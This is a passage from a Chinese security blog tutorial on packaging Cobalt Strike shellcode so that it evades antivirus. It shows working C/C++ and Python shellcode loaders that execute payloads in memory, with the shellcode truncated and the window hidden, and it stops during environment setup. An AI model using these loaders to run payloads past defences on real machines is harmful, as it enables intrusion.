<html>
<head>
<title>免杀利用Python免杀CSShellcode</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
免杀 | 利用Python免杀CS Shellcode
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                            
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2020-02-13</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div>

                
                                
                
                

                
                                                                

                
                                    
                    <div class="original_area_primary" style="margin-bottom: 0;">
                                                                                                </div>

                    
                                            <div class="original_area_primary">
                            <p role="option" class="original_primary_card_tips">
                                                                    <span>以下文章来源于合天智汇</span>
                                                                                                    <span>，作者AgeloVito</span>
                                                            </p>
                            <a class="weui-flex original_primary_card appmsg_card_context appmsg_card_active" href="#" id="copyright_info">
                                <div class="weui-flex__hd">
                                    <span class="radius_avatar"> </span>
                                </div>
                                <div class="weui-flex__item" role="option">
                                    <strong class="original_primary_nickname">合天智汇</strong>
                                                                            <span class="weui-hidden_abs">.</span>
                                        <p class="original_primary_desc">为广大信息安全爱好者提供有价值的文章推送服务！</p>
                                                                    </div>
                                <div class="weui-flex__ft"></div>
                            </a>
                        </div><div id="weixin_content"><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;" data-mpa-powered-by="yiban.io"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x01 前言</span></strong></a></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2019年，告别了coder的世界，告别了从前的生活。我决定暂时抛开金钱至上的价值体系，以一个Fucking loser的身份去寻找人生中的三大哲学问题，我是谁，我在哪儿，我在做什么。褪去了互联网行业的尔虞我诈，轻浮缥缈。在这个铺天盖地的泛娱乐时代，我决定去看看大海，去感受下海水的味道，没错，它确实是咸的。当沙滩上的沙子铺满全身的那一刻，我，拥有了几分钟童年。在途中，偶遇了黄河，没错，它确实很黄，并且波涛汹涌。也在这途中，缘分使我进入了曾经告别的安全行业。</span></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x02 概述</span></strong></h2><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、什么是shellcode</span></h3><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">在维基百科中这样解释道：在黑客攻击中，shellcode是一小段代码，用于利用软件漏洞作为有效载荷。它之所以被称为“shellcode”，是因为它通常启动一个命令shell，攻击者可以从这个命令shell控制受损的计算机，但是执行类似任务的任何代码都可以被称为shellcode。因为有效载荷（payload）的功能不仅限于生成shell，所以有些人认为shellcode的名称是不够严谨的。然而，试图取代这一术语的努力并没有得到广泛的接受。shellcode通常是用机器码编写的。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">翻译成人话就是：shellcode是一段机器码，用于执行某些动作。</span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、什么是机器码</span></h3><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">在百度百科中这样解释道：计算机直接使用的程序语言，其语句就是机器指令码，机器指令码是用于指挥计算机应做的操作和操作数地址的一组二进制数。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">翻译成人话就是：<strong style="box-sizing: border-box;">直接</strong>指挥计算机的机器指令码。</span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">人们用助记符号代替机器指令码从而形成了汇编语言，后来为了使计算机用户编程序更容易，发展出了各种高级计算机语言。但是，无论是汇编语言还是其他各种面向过程异或面向对象的高级语言所写的代码最终都要被相关的翻译编译环境转换成相应的机器指令码，计算机才能运行该段代码，因为计算机只认识机器指令码。</span></p><h3 style="box-sizing: border-box;break-inside: avoid;font-size: 1.5em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.43;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">3、什么是shellcode loader</span></h3><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">人话：shellcode loader 是用于加载和运行shellcode的代码。</span></p><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">C/C++ 加载方式</span></h4><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">"pch.h"</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;windows.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;stdio.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">pragma</span> comment(linker,<span class="code-snippet__meta-string">"/subsystem:\"windows\" /entry:\"mainCRTStartup\""</span>)<span class="code-snippet__comment">//不显示窗口</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">char</span> shellcode[] = <span class="code-snippet__string">"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\......"</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">void</span> <span class="code-snippet__title">main</span><span class="code-snippet__params">()</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">  LPVOID Memory = VirtualAlloc(<span class="code-snippet__literal">NULL</span>, <span class="code-snippet__keyword">sizeof</span>(shellcode),MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__keyword">if</span> (Memory == <span class="code-snippet__literal">NULL</span>) { <span class="code-snippet__keyword">return</span>; }</span></code><code><span class="code-snippet_outer">  <span class="code-snippet__built_in">memcpy</span>(Memory, shellcode, <span class="code-snippet__keyword">sizeof</span>(shellcode));</span></code><code><span class="code-snippet_outer">  ((<span class="code-snippet__keyword">void</span>(*)())Memory)();</span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p><br  /></p><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">Python 加载方式</span></h4><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="makefile"><code><span class="code-snippet_outer"><span class="code-snippet__comment">#!/usr/bin/python</span></span></code><code><span class="code-snippet_outer">import ctypes</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">shellcode = bytearray(<span class="code-snippet__string">"\xfc\xe8\x89\x00\x00\x00\x60\x89......"</span>)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span></code><code><span class="code-snippet_outer">                                          ctypes.c_int(len(shellcode)),</span></code><code><span class="code-snippet_outer">                                          ctypes.c_int(0x3000),</span></code><code><span class="code-snippet_outer">                                          ctypes.c_int(0x40))</span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span></code><code><span class="code-snippet_outer">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),</span></code><code><span class="code-snippet_outer">                                     buf,</span></code><code><span class="code-snippet_outer">                                     ctypes.c_int(len(shellcode)))</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),</span></code><code><span class="code-snippet_outer">                                         ctypes.c_int(0),</span></code><code><span class="code-snippet_outer">                                         ctypes.c_int(ptr),</span></code><code><span class="code-snippet_outer">                                         ctypes.c_int(0),</span></code><code><span class="code-snippet_outer">                                         ctypes.c_int(0),</span></code><code><span class="code-snippet_outer">                                         ctypes.pointer(ctypes.c_int(0)))</span></code><code><span class="code-snippet_outer"> </span></code><code><span class="code-snippet_outer">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))</span></code></pre></section><p><br  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">当然，shellcode loader的编写方式很多，汇编，go，csharp以及其他很多语言，这里不在一一举例，接下来我们进入利用python语言编写 shellcode loader 以达到静态动态都绕过杀软的目的。</span></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x03 为什么使用python</span></strong></h2><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="display: block;box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">python语言入门门槛低，上手快，且两三年前就出现了这种免杀方式，但是很多人说网上公开的代码已经不免杀了。事实真的如此吗？你有没有静下心来code过，是否去了解过相关的原理，是否通过学习到的原理去思维发散过，是否通过code去fuzz过？如果没有，你的Cobaltstrike和Metasploit只适合躺在那儿意淫，怪我咯。废话不多说，进入正题。</span></p><h2 style="box-sizing: border-box;break-inside: avoid;font-size: 1.75em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.225;cursor: text;padding-bottom: 0.3em;border-bottom: 1px solid rgb(238, 238, 238);width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><strong><span style="box-sizing: border-box;font-size:16px;line-height:36px;;font family: arial, helvetica, sans-serif;">0x04 环境准备</span></strong></h2><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">1、python-2.7.17.amd64</span></h4><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">下载地址：https://www.python.org/ftp/python/2.7.17/python-2.7.17.amd64.msi</span></p><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">2、pywin32-227.win-amd64-py2.7</span></h4><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">下载地址：https://github.com/mhammond/pywin32/releases<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-backh="311" data-backw="578" data-cropselx1="0" data-cropselx2="578" data-cropsely1="0" data-cropsely2="311" data-ratio="0.592391304347826" data-s="300,640" data-type="png" data-w="1288" src="图片/HACK学习呀_2020-02-13_免杀利用Python免杀CSShellcode/1_Zdo58GR876RXKCkbrTH3LyC69cuHxg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9Ld0GvMdMIZx77twKBeCuAyylcToRpNfsHtcy0jeQBFmXACZZdo58GR876RXKCkbrTH3LyC69cuHxg/640?wx_fmt=png'" style="width: 578px;height: 342px;"  /></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;"></span></p><h4 style="box-sizing: border-box;break-inside: avoid;font-size: 1.25em;margin-top: 1rem;margin-bottom: 1rem;font-weight: bold;line-height: 1.4;cursor: text;width: inherit;color: rgb(51, 51, 51);white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">3、PyInstaller3.0</span></h4><p style="box-sizing: border-box;margin: 0.8em 0px;width: inherit;color: rgb(51, 51, 51);font-size:16px;line-height:36px;;font-weight: normal;white-space: pre-wrap;font family: &quot;Open Sans&quot;, &quot;Clear Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><span style="box-sizing: border-box;display: block;font-size:15px;line-height:35px;;font family: arial, helvetica, sans-serif;">下载地址：https://github.com/pyinstaller/pyinstaller/releases<br  /></span></p><p style="text-align: center;"><img class="rich_pages js_insertlocalimg" data-ratio="0.6885784716516024" data-s="300,640" data-type="png" 